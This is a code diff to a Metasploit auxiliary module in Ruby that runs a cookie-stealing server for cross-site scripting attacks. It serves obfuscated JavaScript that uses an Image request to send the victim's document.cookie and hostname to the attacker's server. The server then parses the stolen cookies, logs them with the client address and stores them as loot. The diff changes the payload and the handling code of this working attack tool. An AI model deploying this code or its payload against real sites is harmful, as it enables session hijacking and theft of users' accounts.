@@ -31,7 +31,6 @@ class Metasploit3 < Msf::Auxiliary
 		[
 			OptString.new('TARGET_COOKIE', [false, "Name of cookie to dump, leave empty to dump all cookies", ""]),
 			OptBool.new('OBFUSCATE_JAVASCRIPT', [true, "Enables obfuscation of javascript code", true]),
-			OptBool.new('EXTRACT_USERAGENT', [true, "Extracts and logs useragent infomaton", false]),
 		], self.class)
 	end
 
@@ -49,40 +48,37 @@ class Metasploit3 < Msf::Auxiliary
 
 		base_url = generate_base_url(cli, request)
 		status_message = ""
+		cookies = Array.new
 		case request.uri
 		when /\.js(\?|$)/
 			content_type = "text/plain"
 			send_response(cli, generate_js(base_url), {'Content-Type'=> content_type, })
 		when /#{datastore['URIPATH']}\/{0,1}data\/(.*)/
-			cookies = request.uri.to_s[datastore['URIPATH'].length+7..-1].split(';')
+			uri_s = request.uri.to_s.delete(' ')
+			host_pos_start = datastore['URIPATH'].length + 7
+			host = uri_s[host_pos_start .. uri_s.index('/', host_pos_start + 1) - 1]
+			cookies = uri_s[host_pos_start + host.length + 1..-1].split(';')
 			cookiesh = Hash.new()
-			cookies.each do |item|
+			cookies.each do |item| 
 				a,b = item.split('=')
 				cookiesh[a] = b
 			end
+				
 			if datastore['TARGET_COOKIE'] != ""
-				target = cookiesh[datastore['TARGET_COOKIE']]
-				if target != nil
-					status_message = "Cookie: #{target}"
-				else
-					status_message = "Cookie not found"
-				end
-			else
-				status_message = "Cookies: #{cookies.join(';')}"
+				cookiesh.delete_if {|k, v| k != datastore['TARGET_COOKIE']} 
 			end
+		data = "Host: #{host}, Client: #{cli.peerhost}, Cookies: #{cookiesh.map{|k,v| "#{k}=#{v}"}.join(';')}"
+		print_status(data)
+	
+		loot_file = store_loot("document.cookies", "text/file", host, data, nil)	
+		print_status("Stored in #{loot_file}") 
+		
 		#skip it - too  much noise!
 		when /favicon\.ico/
 		else
-			status_message = "Unexpected request: #{request.method} request for #{request.uri}"
+			print "Unexpected request: #{request.method} request for #{request.uri}"
 		end
-
-	if status_message != ""
-		if datastore['EXTRACT_USERAGENT']
-			status_message = status_message + " [#{request['User-Agent']}"
-		end
-		print_status("#{cli.peerhost} - #{status_message}")
-	end
-
+		
 	#we know nothing!
 	send_not_found(cli)
 	end
@@ -123,7 +119,7 @@ class Metasploit3 < Msf::Auxiliary
 	#Generation and obfuscation of javascript
 	def generate_js(base_url)
 		code = ::Rex::Exploitation::JSObfu.new %Q|
-		new Image().src="#{base_url}/data/"+document.cookie;|
+		new Image().src="#{base_url}/data/"+ window.location.hostname + "/" + document.cookie;|
 
 		if datastore['OBFUSCATE_JAVASCRIPT']
 			code.obfuscate
